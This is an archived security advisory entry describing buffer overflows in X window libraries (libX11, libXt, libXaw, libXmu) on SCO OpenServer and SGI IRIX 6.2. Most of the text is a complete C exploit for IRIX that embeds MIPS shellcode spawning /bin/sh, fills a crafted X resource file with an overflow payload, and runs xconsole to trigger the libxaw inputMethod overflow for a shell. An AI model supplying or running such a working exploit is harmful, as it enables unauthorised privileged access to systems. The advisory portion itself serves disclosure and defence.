source: http://www.securityfocus.com/bid/884/info

SCO Openserver and SGI IRIX (6.2 confirmed, possibly others) are vulnerable to several buffer overflows in various shared libraries related to the X window system. This means that all programs which link to these libraries could be vulnerable to exploitation through buggy library calls. The vulnerable libraries are:

LibX11
LibXt
LibXaw
LibXmu

This vulnerability may be similar to serious X library overflows, in our database as Bugtraq ID 237 (published in August, 1997) and the Sun X problems archived in our database as Bugtraq ID 238 (published in May, 1999). 

/*## copyright LAST STAGE OF DELIRIUM nov 1998 poland        *://lsd-pl.net/ #*/
/*## libxaw.so inputmethod                                                   #*/

#include <fcntl.h>

#define NOPNUM 500
#define ADRNUM 500
#define PCHNUM 500

char shellcode[]=
    "\x04\x10\xff\xff"    /* bltzal  $zero,<shellcode>    */
    "\x24\x02\x03\xf3"    /* li      $v0,1011             */
    "\x23\xff\x01\x14"    /* addi    $ra,$ra,276          */
    "\x23\xe4\xff\x08"    /* addi    $a0,$ra,-248         */
    "\x23\xe5\xff\x10"    /* addi    $a1,$ra,-240         */
    "\xaf\xe4\xff\x10"    /* sw      $a0,-240($ra)        */
    "\xaf\xe0\xff\x14"    /* sw      $zero,-236($ra)      */
    "\xa3\xe0\xff\x0f"    /* sb      $zero,-241($ra)      */
    "\x03\xff\xff\xcc"    /* syscall                      */
    "/bin/sh"
;

char jump[]=
    "\x03\xa0\x10\x25"    /* move    $v0,$sp              */
    "\x03\xe0\x00\x08"    /* jr      $ra                  */
;

char nop[]="\x24\x0f\x12\x34";

main(int argc,char **argv){
    char buffer[10000],adr[4],pch[4],*b,*envp[2];
    int i,fd;

    printf("copyright LAST STAGE OF DELIRIUM nov 1998 poland  //lsd-pl.net/\n");
    printf("libxaw.so inputmethod for irix 6.2 IP:17,19,20,21,22\n\n");

    if(argc!=2){
        printf("usage: %s xserver:display\n",argv[0]);
        exit(-1);
    }

    *((unsigned long*)adr)=(*(unsigned long(*)())jump)()+8300+1000+200+12976;
    *((unsigned long*)pch)=(*(unsigned long(*)())jump)()+8300+500+200+32732;

    envp[0]="XENVIRONMENT=resource";
    envp[1]=0;

    strcpy(buffer,"*text*international:    true\n");
    strcat(buffer,"*shellext*inputMethod:  ");
    b=buffer+strlen(buffer);
    for(i=0;i<PCHNUM;i++) *b++=pch[i%4];
    for(i=0;i<ADRNUM;i++) *b++=adr[i%4];
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4];
    for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    *b++='\n';

    fd=open("resource",O_CREAT|O_WRONLY,0666);
    write(fd,buffer,strlen(buffer));
    close(fd);

    execle("/usr/bin/X11/xconsole","lsd","-display",argv[1],0,envp);
}